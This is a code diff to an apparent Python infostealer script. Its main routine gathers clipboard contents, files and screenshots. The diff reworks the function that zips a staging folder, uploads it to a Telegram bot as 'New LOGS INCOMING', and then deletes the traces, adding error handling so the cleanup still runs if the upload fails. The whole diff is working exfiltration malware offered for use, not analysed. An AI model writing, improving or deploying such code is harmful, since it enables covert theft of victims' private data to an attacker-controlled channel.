@@ -496,28 +496,33 @@ def generate_random_string(n):
 def zip_and_send_out():
     chat_id =  "CHAT_ID"
     token = "BOT_TOKEN"
-    random_string = generate_random_string(15)
+    random_string = generate_random_string(15) 
     zip_name = f"{random_string}.zip"
     folder_path = "C:\\win_ord"
-    
     dest_path = "C:\\windll"
-    os.chmod(folder_path, 0o777)
-    zip_path = os.path.join(dest_path, zip_name)
-    os.makedirs(os.path.dirname("C:\\windll\\"+zip_name), exist_ok=True)
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-        for root, dirs, files in os.walk(folder_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                zip_file.write(file_path, os.path.relpath(file_path, folder_path))
-    with open(zip_path, 'rb') as zip_file:
-        url = f'https://api.telegram.org/bot{token}/sendDocument'
-        msg = f"New LOGS INCOMING"
-        files = {'document': zip_file}
-        data = {'chat_id': chat_id, 'caption': f'{msg}'}
-        response = requests.post(url, files=files, data=data)
-    os.remove(zip_path)
-    shutil.rmtree(r"C:\\win_ord")
-    shutil.rmtree(r"C:\\windll")
+    try:
+        os.chmod(folder_path, 0o777)
+        zip_path = os.path.join(dest_path, zip_name)
+        os.makedirs(os.path.dirname("C:\\windll\\"+zip_name), exist_ok=True)
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            for root, dirs, files in os.walk(folder_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))
+        with open(zip_path, 'rb') as zip_file:
+            url = f'https://api.telegram.org/bot{token}/sendDocument'
+            msg = f"New LOGS INCOMING"
+            files = {'document': zip_file}
+            data = {'chat_id': chat_id, 'caption': f'{msg}'}
+            response = requests.post(url, files=files, data=data)
+        os.remove(zip_path)
+        shutil.rmtree(r"C:\\win_ord")
+        shutil.rmtree(r"C:\\windll")
+    except:
+        os.remove(zip_path)
+        shutil.rmtree(r"C:\\win_ord")
+        shutil.rmtree(r"C:\\windll")
+
 
 
 def main():
@@ -526,6 +531,7 @@ def main():
         get_clipb_data()
         get_files()
         get_screenshot()
+
         zip_and_send_out()
     
 main()
